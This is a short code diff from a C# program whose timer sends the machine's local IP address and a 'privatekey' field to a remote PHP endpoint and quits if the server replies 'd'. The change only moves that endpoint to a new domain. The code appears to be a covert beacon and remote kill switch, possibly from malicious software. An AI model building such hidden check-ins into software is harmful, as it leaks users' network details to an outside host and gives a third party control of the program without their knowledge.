@@ -263,13 +263,13 @@ namespace VORS2._0_the_fuckery_countinues
         private void Timer10_Tick(object sender, EventArgs e)
         {
             try
-            {
-                var url = string.Format("http://csoftware.cf/vors/ds.php?ip=" + GetLocalIPv4(NetworkInterfaceType.Ethernet) + "&privatekey=UNKNOWN");
+            { 
+                var url = string.Format("https://enclica.com/vors/ds.php?ip=" + GetLocalIPv4(NetworkInterfaceType.Ethernet) + "&privatekey=UNKNOWN");
                 using (var webClient = new WebClient())
                 {
-                    var response = webClient.DownloadString(url);
+                    var response = webClient.DownloadString(url);         
 
-                    if (response == "d")
+                    if (response == "d")                      
                     {
                         System.Environment.Exit(1);
                     }
